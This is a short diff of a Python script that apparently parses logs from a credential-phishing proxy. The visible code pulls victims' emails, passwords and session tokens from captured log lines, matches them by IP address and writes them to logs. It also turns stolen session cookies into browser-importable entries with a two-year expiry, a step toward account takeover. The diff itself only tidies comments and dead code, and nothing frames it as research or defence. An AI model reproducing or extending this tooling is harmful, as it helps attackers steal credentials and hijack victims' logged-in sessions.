@@ -144,7 +144,7 @@ def dump_tokens(setcookies, tokens, token_domains):
         name = tk
         val = setcookies[tk]
         domain = token_domains[tk]
-        expire_time = int(time.time() + 2 * 365 * 24 * 60 * 60) # 2 years in the future
+        expire_time = int(time.time() + 2 * 365 * 24 * 60 * 60) # 2 years into the future
         ck = {}
         ck['domain'] = domain
         ck["expirationDate"] = expire_time
@@ -446,7 +446,7 @@ def parser_main(args):
                         for line in lines:
                             if len(line) > 0:
                                 remote_addr, user_agent, email, passwd, tokens = parse_line(creds_cfg, cur_email, line)
-                                if remote_addr != '': # and ((email != '' and passwd != '') or tokens != ''):
+                                if remote_addr != '':
                                     if remote_addr in email_by_ips:
                                         email = email_by_ips[remote_addr]
                                     if remote_addr in passwd_by_ips:
@@ -466,9 +466,6 @@ def parser_main(args):
                                         last_passwd = ''
                                         ntokens += 1
                                         do_log = True
-    #                                if email == '' and remote_addr in clients:
-    #                                    email = clients[remote_addr].email
-    #                                    passwd = clients[remote_addr].passwd
 
                                     if do_log:
                                         create_log(out_dir, logn, user_agent, email, passwd, tokens)
